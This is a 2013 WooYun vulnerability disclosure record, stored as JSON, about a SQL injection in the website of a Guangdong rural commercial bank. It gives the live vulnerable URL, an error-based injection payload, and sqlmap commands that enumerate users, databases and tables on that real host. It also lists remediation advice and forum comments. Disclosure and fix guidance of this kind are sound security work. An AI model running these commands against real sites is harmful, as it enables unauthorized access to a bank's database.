{"id": 7347, "wybug_id": "wooyun-2013-046013", "wybug_title": "广东省某农村商业银行SQL注入漏洞", "wybug_corp": "广东省某农村商业银行", "wybug_author": "0x334", "wybug_date": "2013-12-15 14:32", "wybug_open_date": "2013-12-20 14:32", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "11", "wybug_status": "已交由第三方合作机构(广东省信息安全测评中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-12-15：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-12-20：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 广东省某农村商业银行SQL注入漏洞 ，可导致网站被入侵等。form I-SOON Security Team。 详细说明：  广东省高明农村商业银行SQL注入漏洞http://www.gmrbank.com.cn/cpjs/index_1167.aspx?cid=2%20and%20user%3E0\n\nand user>0，我们知道，user是SQLServer的一个内置变量，它的值是当前连接的用户名，类型为nvarchar。拿一个 nvarchar的值跟int的数0比较，系统会先试图将nvarchar的值转成int型，当然，转的过程中肯定会出错，SQLServer的出错提示 是：将nvarchar值 ”dbo” 转换数据类型为 int 的列时发生语法错误，呵呵，dbo正是变量user的值，这样，就拿到了数据库的用户名。直接用sqlmap跑了，不用手工开始注了。获取用户名./sqlmap.py  -u \"www.gmrbank.com.cn/cpjs/index_1167.aspx?cid=2\" --user-agent \"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)\" --users -v  0\n\n./sqlmap.py  -u \"www.gmrbank.com.cn/cpjs/index_1167.aspx?cid=2\" --user-agent \"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)\" –dbs –level 3 –risk 2 \n\nsqlmap.py  -u \"www.gmrbank.com.cn/cpjs/index_1167.aspx?cid=2\" --user-agent \"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)\" -D hds01600734_db –tables\n\nsqlmap.py  -u \"www.gmrbank.com.cn/cpjs/index_1167.aspx?cid=2\" --user-agent \"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)\" -D master –tables\n\n   漏洞证明：  如上   修复方案：  解决SQL注入问题的关键是对所有可能来自用户输入的数据进行严格的检查、对数据库配置使用最小权限原则。 1.\t所有的查询语句都使用数据库提供的参数化查询接口，参数化的语句使用参数而不是将用户输入变量嵌入到SQL语句中。当前几乎所有的数据库系统都提供了参数化SQL语句执行接口，使用此接口可以非常有效的防止SQL注入攻击。2.\t对进入数据库的特殊字符（'\"\\尖括号&*;等）进行转义处理，或编码转换。3.\t严格限制变量类型，比如整型变量就采用intval()函数过滤，数据库中的存储字段必须对应为int型。4.\t数据长度应该严格规定，能在一定程度上防止比较长的SQL注入语句无法正确执行。5.\t网站每个数据层的编码统一，建议全部使用UTF-8编码，上下层编码不一致有可能导致一些过滤模型被绕过。6.\t严格限制网站用户的数据库的操作权限，给此用户提供仅仅能够满足其工作的权限，从而最大限度的减少注入攻击对数据库的危害。7.\t避免网站显示SQL错误信息，比如类型错误、字段不匹配等，防止攻击者利用这些错误信息进行一些判断。8.\t在网站发布之前建议使用一些专业的SQL注入检测工具进行检测，及时修补这些SQL注入漏洞。   版权声明：转载请注明来源 0x334@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2013-12-20 14:32 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-12-15 14:34 |    \t\tM4sk \t\t\t( 普通白帽子  |\t\t\t        Rank:1199 漏洞数:319        | 国内信息安全任重而道远，还需要厂商和白帽...)\t\t \n  form I-SOON Security Team 亮了    \n     2013-12-15 14:43 |    \t\t基佬库克 \t\t\t( 实习白帽子  |\t\t\t        Rank:75 漏洞数:15        | 简介什么的是直接爆菊吧..)\t\t \n  广东很多农村商业银行吗??这是直接漏了...    \n     2013-12-15 18:11 |    \t\tM4sk \t\t\t( 普通白帽子  |\t\t\t        Rank:1199 漏洞数:319        | 国内信息安全任重而道远，还需要厂商和白帽...)\t\t \n  目测是dede吗    \n     2013-12-15 19:27 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  form？表单？还是说from？    \n     2013-12-15 23:53 |    \t\tCroxy \t\t\t( 普通白帽子  |\t\t\t        Rank:513 漏洞数:54        | 只会送人头)\t\t \n  英语老师哭了    \n     2013-12-16 14:41 |    \t\t0x334 \t\t\t( 普通白帽子  |\t\t\t        Rank:171 漏洞数:35        | 漏洞无影响，已忽略～～～～～～～)\t\t \n  =。=你们原谅一个还在补考CET4的孩子吧～    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}